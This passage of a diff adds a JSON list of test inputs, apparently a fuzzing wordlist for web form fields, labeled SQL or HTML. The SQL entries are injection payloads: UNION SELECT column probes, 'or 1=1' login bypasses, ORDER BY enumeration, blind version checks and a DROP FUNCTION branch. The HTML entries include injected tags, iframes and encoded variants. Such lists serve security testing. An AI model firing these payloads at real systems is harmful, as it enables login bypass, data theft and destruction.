+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX'#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "'-'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' '",
+        "category": "SQL"
+    },
+    {
+        "inputField": "'&'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "'^'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "'*'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' or ''-'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' or '' '",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' or ''&'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' or ''^'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' or ''*'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\"-\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\" \"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\"&\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\"^\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\"*\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\" or \"\"-\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\" or \"\" \"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\" or \"\"&\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\" or \"\"^\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\" or \"\"*\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or true--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\" or true--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' or true--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\") or true--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "') or true--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "' or 'x'='x",
+        "category": "SQL"
+    },
+    {
+        "inputField": "') or ('x')=('x",
+        "category": "SQL"
+    },
+    {
+        "inputField": "')) or (('x'))=(('x",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\" or \"x\"=\"x",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\") or (\"x\")=(\"x",
+        "category": "SQL"
+    },
+    {
+        "inputField": "\")) or ((\"x\"))=((\"x",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or 1=1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or 1=1--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or 1=1#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "or 1=1/*",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin' --",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin' #",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin'/*",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin' or '1'='1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin' or '1'='1'--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin' or '1'='1'#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin' or '1'='1'/*",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin'or 1=1 or ''='",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin' or 1=1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin' or 1=1--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin' or 1=1#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin' or 1=1/*",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin') or ('1'='1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin') or ('1'='1'--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin') or ('1'='1'#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin') or ('1'='1'/*",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin') or '1'='1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin') or '1'='1'--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin') or '1'='1'#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin') or '1'='1'/*",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\" --",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\" #",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\"/*",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\" or \"1\"=\"1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\" or \"1\"=\"1\"--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\" or \"1\"=\"1\"#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\" or \"1\"=\"1\"/*",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\"or 1=1 or \"\"=\"",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\" or 1=1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\" or 1=1--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\" or 1=1#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\" or 1=1/*",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\") or (\"1\"=\"1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\") or (\"1\"=\"1\"--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\") or (\"1\"=\"1\"#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\") or (\"1\"=\"1\"/*",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\") or \"1\"=\"1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\") or \"1\"=\"1\"--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\") or \"1\"=\"1\"#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "admin\") or \"1\"=\"1\"/*",
+        "category": "SQL"
+    },
+    {
+        "inputField": "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR 1=1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR 1=0",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR x=x",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR x=y",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR 1=1#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR 1=0#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR x=x#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR x=y#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR 1=1--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR 1=0--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR x=x--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR x=y--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR 3409=3409 AND ('pytW' LIKE 'pytW",
+        "category": "SQL"
+    },
+    {
+        "inputField": "OR 3409=3409 AND ('pytW' LIKE 'pytY",
+        "category": "SQL"
+    },
+    {
+        "inputField": "HAVING 1=1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "HAVING 1=0",
+        "category": "SQL"
+    },
+    {
+        "inputField": "HAVING 1=1#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "HAVING 1=0#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "HAVING 1=1--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "HAVING 1=0--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 1=1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 1=0",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 1=1--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 1=0--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 1=1#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 1=0#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 1=1 AND '%'='",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 1=0 AND '%'='",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 1083=1083 AND (1427=1427",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 7506=9091 AND (5913=5913",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 1083=1083 AND ('1427=1427",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 7506=9091 AND ('5913=5913",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 7300=7300 AND 'pKlZ'='pKlZ",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 7300=7300 AND 'pKlZ'='pKlY",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 7300=7300 AND ('pKlZ'='pKlZ",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AND 7300=7300 AND ('pKlZ'='pKlY",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AS INJECTX WHERE 1=1 AND 1=1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AS INJECTX WHERE 1=1 AND 1=0",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AS INJECTX WHERE 1=1 AND 1=1#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AS INJECTX WHERE 1=1 AND 1=0#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AS INJECTX WHERE 1=1 AND 1=1--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "AS INJECTX WHERE 1=1 AND 1=0--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "WHERE 1=1 AND 1=1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "WHERE 1=1 AND 1=0",
+        "category": "SQL"
+    },
+    {
+        "inputField": "WHERE 1=1 AND 1=1#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "WHERE 1=1 AND 1=0#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "WHERE 1=1 AND 1=1--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "WHERE 1=1 AND 1=0--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 2--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 3--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 4--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 5--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 6--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 7--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 8--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 9--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 10--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 11--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 12--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 13--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 14--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 15--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 16--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 17--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 18--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 19--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 20--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 21--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 22--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 23--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 24--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 25--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 26--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 27--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 28--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 29--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 30--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 31337--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 2#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 3#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 4#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 5#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 6#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 7#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 8#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 9#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 10#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 11#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 12#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 13#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 14#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 15#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 16#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 17#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 18#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 19#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 20#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 21#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 22#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 23#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 24#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 25#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 26#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 27#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 28#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 29#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 30#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 31337#",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 1",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 2",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 3",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 4",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 5",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 6",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 7",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 8",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 9",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 10",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 11",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 12",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 13",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 14",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 15",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 16",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 17",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 18",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 19",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 20",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 21",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 22",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 23",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 24",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 25",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 26",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 27",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 28",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 29",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 30",
+        "category": "SQL"
+    },
+    {
+        "inputField": "ORDER BY 31337",
+        "category": "SQL"
+    },
+    {
+        "inputField": "RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
+        "category": "SQL"
+    },
+    {
+        "inputField": "RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
+        "category": "SQL"
+    },
+    {
+        "inputField": "IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
+        "category": "SQL"
+    },
+    {
+        "inputField": "%' AND 8310=8310 AND '%'='",
+        "category": "SQL"
+    },
+    {
+        "inputField": "%' AND 8310=8311 AND '%'='",
+        "category": "SQL"
+    },
+    {
+        "inputField": "and (select substring(@@version,1,1))='X'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "and (select substring(@@version,1,1))='M'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "and (select substring(@@version,2,1))='i'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "and (select substring(@@version,2,1))='y'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "and (select substring(@@version,3,1))='c'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "and (select substring(@@version,3,1))='S'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "and (select substring(@@version,3,1))='X'",
+        "category": "SQL"
+    },
+    {
+        "inputField": "",
+        "category": "SQL"
+    },
+        {
+        "inputField": "<h1>HTML</h1>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<h1>html</h1>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<h2>HTML</h2>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<h3>HTML</h3>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<h4>HTML</h4>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<h5>HTML</h5>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<h6>HTML</h6>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<pre>HTML</pre>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<p>HTML</p>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<i>HTML</i>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<a href=\"https://www.google.com\">HTML</a>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<abbr title=\"HTML\">HTML</abbr>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<acronym title=\"Armour Infosec\">AI</acronym>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<address>address,address</address>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<article><h2>Armour Infosec</h2></article>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<audio controls><source src=\"demo.ogg\" type=\"audio/ogg\"><source src=\"demo.mp3\" type=\"audio/mpeg\"></audio>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<b>HTML</b>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<h1>HTML</h1><!--",
+        "category": "HTML"
+    },
+    {
+        "inputField": "qq<h1>HTML</h1>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "qq<h1>HTML</h1>qq",
+        "category": "HTML"
+    },
+    {
+        "inputField": "$$\\<u>HTML</u>{}$$",
+        "category": "HTML"
+    },
+    {
+        "inputField": "%3Ch1%3EHTML%3C%2Fh1%3E",
+        "category": "HTML"
+    },
+    {
+        "inputField": "&lt;h1&gt;HTML&lt;/h1&gt;",
+        "category": "HTML"
+    },
+    {
+        "inputField": "&#60;h1&#62;HTML&#60;/h1&#62;",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<iframe src=\"https://www.google.com\" title=\"test\"></iframe>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "123<h1>HTML</h1>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<h1>HTML</h1>123",
+        "category": "HTML"
+    },
+    {
+        "inputField": "123<h1>HTML</h1>123",
+        "category": "HTML"
+    },
+    {
+        "inputField": "%253Ch1%253EHTML%253C%252Fh1%253E",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<iframe id=\"if1\" src=\"https://www.google.com\"></iframe>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<iframe id=\"if2\" src=\"https://www.google.com\"></iframe>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "PGgxPkhUTUw8L2gxPg==",
+        "category": "HTML"
+    },
+    {
+        "inputField": "UEdneFBraFVUVXc4TDJneFBnPT0=",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<<h1>HTML</h1>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<<h1>HTML</h1>>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<<h1>html</h1>>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "%253Ch1%253EHTML%253C%252Fh1%253E<h1>Html</h1>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<pre>HTML</pre>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<p>HTMLinjection here</p>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<i>HTML</i>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<u>Html</u>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<mark>Html</mark>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<a href=\"https://www.google.com\">HTML</a>",
